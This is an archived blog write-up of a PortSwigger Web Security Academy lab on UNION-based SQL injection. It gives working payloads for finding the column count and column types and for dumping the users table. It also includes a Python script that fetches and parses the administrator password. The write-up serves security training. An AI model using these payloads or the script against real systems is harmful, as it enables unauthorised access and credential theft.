# SQL Injection — Lab #5 SQL injection UNION attack, retrieving data from other tables

- **Source URL:** https://m-abdullah-lab.medium.com/sql-injection-lab-5-sql-injection-union-attack-retrieving-data-from-other-tables-82500db264ae
- **Fetched from:** https://m-abdullah-lab.medium.com/sql-injection-lab-5-sql-injection-union-attack-retrieving-data-from-other-tables-82500db264ae?source=rss-285386e66314------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 14932)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Muhammad Abdullah / Sun, 04 Oct 2026 05:49:57 GMT

This post is a walkthrough of Lab #5 in the PortSwigger Web Security Academy.

Topic: SQL Injection (SQLi) UNION Attacks.

Goal: Retrieve data (usernames and passwords) from a different database table (users) that is not part of the original query.

Prerequisites: This lab builds directly on Lab #3 (finding column count) and Lab #4 (finding data types).

1\. Scenario & Objective

Vulnerability: SQL injection in the product category filter (/filter?category=...).

Database Info: The database contains a table named users with columns username and password.

Goal: Perform a UNION attack to dump the users table, extract the administrator's password, and log in.

2\. Manual Exploitation Steps

The process involves three distinct steps:

Step A: Determine the Number of Columns

Method: Use ORDER BY clause.

Payloads:

' ORDER BY 1 -- (200 OK)

' ORDER BY 2 -- (200 OK)

' ORDER BY 3 -- (500 Internal Server Error)

Conclusion: The query has 2 columns.

Step B: Determine Data Types

Method: Use UNION SELECT with string payloads to see which columns accept text.

Payload: ' UNION SELECT 'a', 'a' --

Result: The page loads without error, and the letter ‘a’ appears in both positions on the page.

Conclusion: Both columns are of type String (Text). This is perfect because we need to dump two text fields (username and password).

Step C: Retrieve Data from the

users

Table

Goal: Select username and password from the users table and combine it with the original product results.

Payload:

SQL

' UNION SELECT username, password FROM users --

Result: The application displays the product list, followed by the user credentials appended at the bottom.

Example Output:

carlos | password123

administrator | x7834... (Target)

Final Action: Copy the administrator password and log in to solve the lab.

3\. Automated Exploitation (Python Scripting)

The instructor writes a Python script to automate the retrieval of the administrator’s password. Unlike previous scripts that discovered columns dynamically, this script hardcodes the column count (2) and types to focus on the data extraction logic.

Script Structure

Setup:

Import requests, sys, urllib3, and BeautifulSoup.

Configure proxy (Burp Suite) and disable SSL warnings.

The Attack Function:

URL/Path: /filter?category=Gifts

Payload: ' UNION SELECT username, password FROM users --

Request: Sends a GET request with the payload appended.

Parsing the Response (The “Hacker” Logic):

The script needs to find the specific password for the user “administrator”.

HTML Parsing Logic (BeautifulSoup):

Find the element containing the text "administrator".

Traverse up to its parent row (\<tr> or equivalent).

Find the next cell (\<td>) which contains the password.

def normalize\_url(url): if not url.startswith(("http://", "https://")): url = "https://" + url if not url.endswith("/"): url += "/" return url

def exploit\_sqli\_users\_table(url): path = "filter?category=Gifts" sql\_payload = "' UNION select username, password from users--" try: r = requests.get( url + path + sql\_payload, verify=False, proxies=PROXIES, timeout=10 ) except requests.RequestException as e: print(f"\[!\] Request error: {e}") return False if "administrator" in r.text: print("\[+\] Found the administrator password.") soup = BeautifulSoup(r.text, "html.parser") admin\_cell = soup.find(text="administrator") if admin\_cell: admin\_password = ( admin\_cell.parent.find\_next("td").get\_text(strip=True) ) print(f"\[+\] The administrator password is '{admin\_password}'") return True return False

def main(): parser = argparse.ArgumentParser( description="SQLi users table dumper" ) parser.add\_argument("url", nargs="?", help="Target base URL") args = parser.parse\_args() # Interactive fallback url = args.url or input("Enter target URL: ").strip() url = normalize\_url(url) print("\[+\] Dumping the list of usernames and passwords...") if not exploit\_sqli\_users\_table(url): print("\[-\] Did not find an administrator password.")

if \_\_name\_\_ == "\_\_main\_\_": main()

4\. Key Takeaways

Mapping comes first: You cannot dump data until you know the column count and data types (Steps 1 & 2).

Table/Column Names: In this lab, we were told the table is users and columns are username/password. In real scenarios (black box), you would need to guess these or retrieve them from the database's metadata tables (e.g., information\_schema).

HTML Parsing: When automating, simply getting the page text isn’t enough. You often need to parse the HTML structure to extract the specific data point (like a specific user’s password) rather than just dumping the whole page.
